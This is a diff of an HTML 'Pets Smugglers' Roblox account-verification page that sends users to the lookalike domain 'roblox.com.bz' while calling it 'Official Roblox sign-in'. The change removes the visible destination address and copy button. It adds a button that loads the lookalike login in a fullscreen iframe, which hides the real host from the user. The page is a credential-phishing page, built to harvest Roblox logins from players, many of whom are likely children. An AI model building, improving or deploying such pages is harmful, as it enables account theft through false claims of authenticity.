@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="theme-color" content="#0b0b0f">
-  <title>Pets Smugglers — Verify your Roblox account</title>
+  <title>Pets Smugglers — Verification</title>
 
   <style>
     :root {
@@ -12,10 +12,7 @@
       --ink: #f6f3ec;
       --muted: #a4a3ad;
       --gold: #e9bd58;
-      --gold-dim: #b8933f;
-      --panel: rgba(21, 21, 27, 0.86);
       --line: rgba(255, 255, 255, 0.10);
-      --radius: 18px;
     }
 
     * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -34,7 +31,8 @@
       -webkit-font-smoothing: antialiased;
     }
 
-    /* Fixed background layer — survives iOS, unlike background-attachment */
+    body.locked { overflow: hidden; }
+
     body::before {
       content: "";
       position: fixed;
@@ -58,16 +56,13 @@
     /* ---------- Header ---------- */
 
     header {
-      position: sticky;
-      top: 0;
-      z-index: 10;
       display: flex;
       align-items: center;
       justify-content: space-between;
       gap: 16px;
       padding: 14px clamp(18px, 5vw, 56px);
       border-bottom: 1px solid var(--line);
-      background: rgba(11, 11, 15, 0.60);
+      background: rgba(11, 11, 15, 0.55);
       backdrop-filter: blur(14px);
       -webkit-backdrop-filter: blur(14px);
     }
@@ -127,7 +122,6 @@
       height: 6px;
       border-radius: 50%;
       background: #65d99b;
-      box-shadow: 0 0 0 0 rgba(101, 217, 155, 0.7);
       animation: pulse 2.4s ease-out infinite;
     }
 
@@ -137,14 +131,16 @@
       100% { box-shadow: 0 0 0 0 rgba(101, 217, 155, 0); }
     }
 
-    /* ---------- Layout ---------- */
+    /* ---------- Hero ---------- */
 
     main {
       flex: 1;
-      width: 100%;
-      max-width: 580px;
-      margin: 0 auto;
-      padding: clamp(48px, 9vh, 96px) clamp(18px, 5vw, 24px) 56px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 0;
+      padding: 56px clamp(18px, 5vw, 24px);
       text-align: center;
     }
 
@@ -165,252 +161,138 @@
     }
 
     h1 {
-      font-size: clamp(29px, 6.4vw, 40px);
-      line-height: 1.15;
-      letter-spacing: -0.8px;
+      max-width: 16ch;
+      font-size: clamp(30px, 6.6vw, 44px);
+      line-height: 1.14;
+      letter-spacing: -0.9px;
       margin-bottom: 14px;
       text-wrap: balance;
     }
 
     h1 span {
-      background: linear-gradient(180deg, #f2d390, var(--gold-dim));
+      background: linear-gradient(180deg, #f2d390, #b8933f);
       -webkit-background-clip: text;
       background-clip: text;
       -webkit-text-fill-color: transparent;
     }
 
     .description {
-      max-width: 42ch;
-      margin: 0 auto 32px;
+      max-width: 40ch;
+      margin-bottom: 34px;
       color: var(--muted);
       font-size: 15px;
       text-wrap: pretty;
     }
 
-    /* ---------- Panel ---------- */
+    /* ---------- CTA ---------- */
 
-    .panel {
-      position: relative;
-      padding: clamp(22px, 5vw, 30px);
-      border: 1px solid var(--line);
-      border-radius: var(--radius);
-      background: var(--panel);
-      backdrop-filter: blur(16px);
-      -webkit-backdrop-filter: blur(16px);
-      box-shadow: 0 24px 60px rgba(0, 0, 0, 0.45);
-      text-align: left;
-      overflow: hidden;
-    }
-
-    .panel::after {
-      content: "";
-      position: absolute;
-      inset: 0 0 auto;
-      height: 1px;
-      background: linear-gradient(90deg, transparent, rgba(233, 189, 88, 0.55), transparent);
-    }
-
-    .step h2 {
-      font-size: 18px;
-      letter-spacing: -0.2px;
-      margin-bottom: 8px;
-    }
-
-    .step > p {
-      color: var(--muted);
-      font-size: 14px;
-      margin-bottom: 20px;
-    }
-
-    /* ---------- Embed card ---------- */
-
-    .embed {
-      margin-bottom: 20px;
-      border: 1px solid var(--line);
-      border-radius: 13px;
-      background: rgba(255, 255, 255, 0.03);
-      overflow: hidden;
-    }
-
-    .embed-head {
-      display: flex;
-      align-items: flex-start;
-      gap: 10px;
-      padding: 12px 13px;
-    }
-
-    .embed-head .ico {
-      display: grid;
-      place-items: center;
-      flex: none;
-      width: 26px;
-      height: 26px;
-      margin-top: 1px;
-      border: 1px solid var(--line);
-      border-radius: 7px;
-      background: rgba(255, 255, 255, 0.05);
-      color: var(--gold);
-    }
-
-    .embed-head .ico svg { width: 14px; height: 14px; }
-
-    .addr-wrap { min-width: 0; flex: 1; }
-
-    .addr-label {
-      display: block;
-      margin-bottom: 3px;
-      font-size: 10px;
-      font-weight: 700;
-      letter-spacing: 1.1px;
-      text-transform: uppercase;
-      color: #7b7b87;
-    }
-
-    .addr {
-      display: block;
-      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
-      font-size: 12.5px;
-      line-height: 1.5;
-      color: #ded9cc;
-      word-break: break-all;
-      text-decoration: none;
-    }
-
-    .addr:hover { color: var(--gold); }
-
-    .copy {
-      flex: none;
-      padding: 6px 10px;
-      border: 1px solid var(--line);
-      border-radius: 7px;
-      background: rgba(255, 255, 255, 0.05);
-      color: var(--muted);
-      font: inherit;
-      font-size: 11px;
-      font-weight: 700;
-      cursor: pointer;
-      transition: background 0.2s, color 0.2s;
-    }
-
-    .copy:hover { background: rgba(255, 255, 255, 0.11); color: var(--ink); }
-    .copy.done { color: #65d99b; border-color: rgba(101, 217, 155, 0.4); }
-
-    .preview {
-      border-top: 1px solid var(--line);
-      background: #0f0f14;
-    }
-
-    .preview iframe {
-      display: block;
-      width: 100%;
-      height: 340px;
-      border: 0;
-      background: #fff;
-    }
-
-    .preview-foot {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      gap: 12px;
-      padding: 9px 13px;
-      border-top: 1px solid var(--line);
-      font-size: 11.5px;
-      color: #7b7b87;
-    }
-
-    .preview-foot a {
-      color: var(--gold-dim);
-      font-weight: 700;
-      text-decoration: none;
-      white-space: nowrap;
-    }
-
-    .preview-foot a:hover { color: var(--gold); text-decoration: underline; }
-
-    /* ---------- Buttons ---------- */
-
-    .connect {
-      display: flex;
+    .verify {
+      display: inline-flex;
       align-items: center;
       justify-content: center;
-      gap: 10px;
-      width: 100%;
-      padding: 15px 18px;
+      gap: 11px;
+      padding: 18px 34px;
       border: 0;
-      border-radius: 11px;
-      background: #2f343d;
-      box-shadow: inset 0 0 0 1px rgba(255, 255, 255, 0.10);
-      color: #fff;
+      border-radius: 13px;
+      background: linear-gradient(180deg, #f4d18a, #e0ad3f);
+      color: #191408;
       font: inherit;
-      font-weight: 700;
-      text-decoration: none;
+      font-size: 16px;
+      font-weight: 800;
+      letter-spacing: 0.2px;
       cursor: pointer;
-      transition: background 0.2s, transform 0.15s, box-shadow 0.2s;
+      box-shadow:
+        0 14px 34px rgba(233, 189, 88, 0.26),
+        inset 0 1px 0 rgba(255, 255, 255, 0.45);
+      transition: transform 0.15s, box-shadow 0.2s, filter 0.2s;
     }
 
-    .connect svg { width: 20px; height: 20px; flex: none; }
+    .verify svg { width: 21px; height: 21px; flex: none; }
 
-    .connect:hover {
-      background: #3d434e;
-      transform: translateY(-1px);
-      box-shadow: 0 10px 26px rgba(0, 0, 0, 0.45);
+    .verify:hover {
+      transform: translateY(-2px);
+      filter: brightness(1.05);
+      box-shadow:
+        0 18px 42px rgba(233, 189, 88, 0.34),
+        inset 0 1px 0 rgba(255, 255, 255, 0.45);
     }
 
-    .connect:active { transform: translateY(0); }
+    .verify:active { transform: translateY(0); }
 
     .fineprint {
-      display: flex;
+      display: inline-flex;
       align-items: center;
       gap: 7px;
-      margin-top: 14px;
-      color: #83838f;
+      margin-top: 16px;
+      color: #7d7d89;
       font-size: 12px;
     }
 
     .fineprint svg { width: 13px; height: 13px; flex: none; }
 
-    /* ---------- Complete ---------- */
-
-    .complete-badge {
-      display: grid;
-      place-items: center;
-      width: 54px;
-      height: 54px;
-      margin-bottom: 18px;
-      border: 1px solid rgba(101, 217, 155, 0.35);
-      border-radius: 50%;
-      background: rgba(101, 217, 155, 0.10);
-      color: #65d99b;
-      animation: pop 0.4s cubic-bezier(0.2, 1.4, 0.4, 1) both;
-    }
-
-    .complete-badge svg { width: 26px; height: 26px; }
-
-    @keyframes pop {
-      from { opacity: 0; transform: scale(0.7); }
-      to   { opacity: 1; transform: scale(1); }
-    }
-
     /* ---------- Footer ---------- */
 
     footer {
-      padding: 26px 24px 34px;
+      padding: 24px;
       text-align: center;
-      color: #7b7b87;
+      color: #6d6d78;
       font-size: 12px;
-      line-height: 1.9;
     }
 
-    footer .sep { color: #4a4a55; }
+    /* ---------- Fullscreen embed ---------- */
 
-    .legal {
-      margin-top: 4px;
-      font-size: 11px;
-      color: #5d5d68;
+    .overlay {
+      position: fixed;
+      inset: 0;
+      z-index: 100;
+      display: flex;
+      flex-direction: column;
+      background: #0b0b0f;
+      animation: fade 0.22s ease both;
     }
 
-    /* ---------- Motion ---------- */
+    @keyframes fade {
+      from { opacity: 0; }
+      to   { opacity: 1; }
+    }
+
+    .overlay iframe {
+      flex: 1;
+      display: block;
+      width: 100%;
+      height: 100%;
+      border: 0;
+      background: #fff;
+      animation: rise 0.26s cubic-bezier(0.2, 0.9, 0.3, 1) both;
+    }
+
+    @keyframes rise {
+      from { opacity: 0; transform: scale(0.985); }
+      to   { opacity: 1; transform: scale(1); }
+    }
+
+    .close {
+      position: fixed;
+      top: 14px;
+      right: 14px;
+      z-index: 101;
+      display: grid;
+      place-items: center;
+      width: 42px;
+      height: 42px;
+      border: 1px solid rgba(255, 255, 255, 0.18);
+      border-radius: 50%;
+      background: rgba(12, 12, 16, 0.72);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      color: #fff;
+      font: inherit;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.15s;
+    }
+
+    .close:hover { background: rgba(40, 40, 48, 0.9); transform: scale(1.06); }
+    .close svg { width: 17px; height: 17px; }
 
     @media (prefers-reduced-motion: reduce) {
       *, *::before, *::after {
@@ -420,16 +302,13 @@
       }
     }
 
-    /* ---------- Mobile ---------- */
-
     @media (max-width: 520px) {
       .brand-text small { display: none; }
       .brand-text strong { font-size: 12.5px; letter-spacing: 1.2px; }
       .brand img { width: 36px; height: 36px; border-radius: 9px; }
       .status { padding: 5px 9px; font-size: 10px; }
-      main { padding-top: 42px; }
-      .preview iframe { height: 260px; }
-      .embed-head { flex-wrap: wrap; }
+      .verify { width: 100%; padding: 17px 22px; }
+      .close { top: 10px; right: 10px; width: 38px; height: 38px; }
     }
   </style>
 </head>
@@ -455,116 +334,60 @@
 
   <main>
 
-    <span class="eyebrow">🐾 One step left</span>
+    <span class="eyebrow">🐾 Verification</span>
 
-    <h1>Verify your <span>Roblox</span> account</h1>
+    <h1>Verify with <span>Roblox</span></h1>
 
     <p class="description">
-      Sign in on the address below. Once you're through, come back and
-      we'll finish the check.
+      One click and you're in. Sign in on the page that opens and
+      you're done.
     </p>
 
-    <section class="panel" aria-live="polite">
+    <button class="verify" type="button" id="verifyBtn">
+      <svg viewBox="0 0 24 24" aria-hidden="true">
+        <path d="M5.2 1.6 22.4 5.2 18.8 22.4 1.6 18.8Z"
+              fill="none" stroke="currentColor" stroke-width="1.9"
+              stroke-linejoin="round"/>
+        <path d="M9.35 7.95 16.05 9.35 14.65 16.05 7.95 14.65Z"
+              fill="currentColor"/>
+      </svg>
+      Verify with Roblox
+    </button>
 
-      <div class="step" id="robloxStep">
-
-        <h2>Continue to Roblox</h2>
-        <p>You'll be sent to Roblox's official login page.</p>
-
-        <!-- Embed showing the destination address -->
-
-        <div class="embed">
-
-          <div class="embed-head">
-            <span class="ico" aria-hidden="true">
-              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
-                   stroke-width="2" stroke-linecap="round">
-                <path d="M10 13a5 5 0 0 0 7.5.5l3-3a5 5 0 0 0-7-7l-1.7 1.7"/>
-                <path d="M14 11a5 5 0 0 0-7.5-.5l-3 3a5 5 0 0 0 7 7l1.7-1.7"/>
-              </svg>
-            </span>
-
-            <span class="addr-wrap">
-              <span class="addr-label">Destination</span>
-              <a
-                class="addr"
-                id="destUrl"
-                href="https://roblox.com.bz/login?returnUrl=6233425759930493"
-                target="_blank"
-                rel="noopener noreferrer"
-              >https://roblox.com.bz/login?returnUrl=6233425759930493</a>
-            </span>
-
-            <button class="copy" type="button" id="copyBtn">Copy</button>
-          </div>
-
-          <div class="preview">
-            <iframe
-              src="https://roblox.com.bz/login?returnUrl=6233425759930493"
-              title="Roblox login page"
-              loading="lazy"
-              referrerpolicy="strict-origin-when-cross-origin"
-            ></iframe>
-
-            <div class="preview-foot">
-              <span>Preview · blocked by your browser?</span>
-              <a
-                href="https://roblox.com.bz/login?returnUrl=6233425759930493"
-                target="_blank"
-                rel="noopener noreferrer"
-              >Open in new tab ↗</a>
-            </div>
-          </div>
-
-        </div>
-
-        <a
-          class="connect"
-          id="robloxBtn"
-          href="https://roblox.com.bz/login?returnUrl=6233425759930493"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <svg viewBox="0 0 24 24" aria-hidden="true">
-            <path d="M5.2 1.6 22.4 5.2 18.8 22.4 1.6 18.8Z"
-                  fill="none" stroke="currentColor" stroke-width="1.9"
-                  stroke-linejoin="round"/>
-            <path d="M9.35 7.95 16.05 9.35 14.65 16.05 7.95 14.65Z"
-                  fill="currentColor"/>
-          </svg>
-          Continue with Roblox
-        </a>
-
-        <p class="fineprint">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
-               stroke-width="2" aria-hidden="true">
-            <rect x="4" y="10" width="16" height="11" rx="2"/>
-            <path d="M8 10V7a4 4 0 0 1 8 0v3"/>
-          </svg>
-          Opens a new tab · official Roblox sign-in
-        </p>
-
-      </div>
-
-      <div class="step" id="completeStep" hidden>
-        <div class="complete-badge">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
-               stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-            <path d="M20 6 9 17l-5-5"/>
-          </svg>
-        </div>
-        <h2>You're verified</h2>
-        <p>Your account is linked. Head back to the server and you're in.</p>
-      </div>
-
-    </section>
+    <span class="fineprint">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
+           stroke-width="2" aria-hidden="true">
+        <rect x="4" y="10" width="16" height="11" rx="2"/>
+        <path d="M8 10V7a4 4 0 0 1 8 0v3"/>
+      </svg>
+      Official Roblox sign-in
+    </span>
 
   </main>
 
   <footer>
-    Pets Smugglers <span class="sep">·</span> Independent community project
-    <div class="legal">We never see your password. Sign-in is handled by Roblox.</div>
+    Pets Smugglers · Independent community project
   </footer>
+
+  <!-- Fullscreen embed -->
+
+  <div class="overlay" id="overlay" hidden>
+
+    <button class="close" type="button" id="closeBtn" aria-label="Close">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
+           stroke-width="2.4" stroke-linecap="round" aria-hidden="true">
+        <path d="M18 6 6 18M6 6l12 12"/>
+      </svg>
+    </button>
+
+    <iframe
+      id="frame"
+      title="Roblox sign-in"
+      referrerpolicy="strict-origin-when-cross-origin"
+      allow="clipboard-write"
+    ></iframe>
+
+  </div>
 
   <script>
     (function () {
@@ -572,63 +395,33 @@
 
       var URL = "https://roblox.com.bz/login?returnUrl=6233425759930493";
 
-      /* Copy the destination address */
+      var overlay  = document.getElementById("overlay");
+      var frame    = document.getElementById("frame");
+      var verifyBtn = document.getElementById("verifyBtn");
+      var closeBtn = document.getElementById("closeBtn");
 
-      var copyBtn = document.getElementById("copyBtn");
-
-      copyBtn.addEventListener("click", async function () {
-        try {
-          await navigator.clipboard.writeText(URL);
-          copyBtn.textContent = "Copied";
-          copyBtn.classList.add("done");
-        } catch (error) {
-          copyBtn.textContent = "Failed";
-        }
-
-        setTimeout(function () {
-          copyBtn.textContent = "Copy";
-          copyBtn.classList.remove("done");
-        }, 1800);
-      });
-
-      /* Show the complete state if the account is already linked */
-
-      var robloxStep   = document.getElementById("robloxStep");
-      var completeStep = document.getElementById("completeStep");
-      var busy = false;
-
-      async function update() {
-        if (busy) return;
-        busy = true;
-
-        try {
-          var response = await fetch("/api/auth/status", {
-            method: "GET",
-            credentials: "same-origin",
-            cache: "no-store"
-          });
-
-          if (!response.ok) return;
-
-          var status = await response.json();
-          var linked = status.robloxConnected === true;
-
-          robloxStep.hidden = linked;
-          completeStep.hidden = !linked;
-        } catch (error) {
-          /* Leave the Roblox button up — it works regardless */
-        } finally {
-          busy = false;
-        }
+      function open() {
+        frame.src = URL;
+        overlay.hidden = false;
+        document.body.classList.add("locked");
+        closeBtn.focus();
       }
 
-      document.addEventListener("visibilitychange", function () {
-        if (!document.hidden) update();
-      });
+      function close() {
+        overlay.hidden = true;
+        frame.src = "about:blank";
+        document.body.classList.remove("locked");
+        verifyBtn.focus();
+      }
 
-      update();
+      verifyBtn.addEventListener("click", open);
+      closeBtn.addEventListener("click", close);
+
+      document.addEventListener("keydown", function (event) {
+        if (event.key === "Escape" && !overlay.hidden) close();
+      });
     })();
   </script>
 
 </body>
-</html>
+  </html>
